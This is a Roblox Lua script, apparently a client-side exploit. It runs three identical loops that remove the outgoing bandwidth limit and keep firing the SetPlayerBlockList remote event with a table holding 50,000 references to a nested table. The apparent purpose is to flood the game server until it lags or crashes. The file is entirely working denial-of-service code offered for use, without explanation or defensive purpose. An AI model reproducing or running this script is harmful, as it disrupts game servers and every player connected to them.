_G.Close = true
local sec = 0.6
spawn(function()
    while wait(sec) do
        if _G.Close == false then return end
        
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        local function getmaxvalue(val)
           local mainvalueifonetable = 699999
           if type(val) ~= "number" then
               return nil
           end
           local calculateperfectval = (mainvalueifonetable/(val+2))
           return calculateperfectval
        end
        
        local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        
        table.insert(spammedtable, {})
        z = spammedtable[1]
        
        for i = 1, tableincrease do
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end
        
        local calculatemax = getmaxvalue(tableincrease)
        
        for i = 1, 50000 do
             table.insert(maintable, spammedtable)
        end
        
        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
        end
        
        bomb(1, 1)
    end 
end)
wait()
spawn(function()
    while wait(sec) do
        if _G.Close == false then return end
        
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        local function getmaxvalue(val)
           local mainvalueifonetable = 699999
           if type(val) ~= "number" then
               return nil
           end
           local calculateperfectval = (mainvalueifonetable/(val+2))
           return calculateperfectval
        end
        
        local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        
        table.insert(spammedtable, {})
        z = spammedtable[1]
        
        for i = 1, tableincrease do
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end
        
        local calculatemax = getmaxvalue(tableincrease)
        
        for i = 1, 50000 do
             table.insert(maintable, spammedtable)
        end
        
        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
        end
        
        bomb(1, 1)
    end 
end)
wait()
spawn(function()
    while wait(sec) do
        if _G.Close == false then return end
        
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        local function getmaxvalue(val)
           local mainvalueifonetable = 699999
           if type(val) ~= "number" then
               return nil
           end
           local calculateperfectval = (mainvalueifonetable/(val+2))
           return calculateperfectval
        end
        
        local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}
        
        table.insert(spammedtable, {})
        z = spammedtable[1]
        
        for i = 1, tableincrease do
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end
        
        local calculatemax = getmaxvalue(tableincrease)
        
        for i = 1, 50000 do
             table.insert(maintable, spammedtable)
        end
        
        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
        end
        
        bomb(1, 1)
    end 
end)
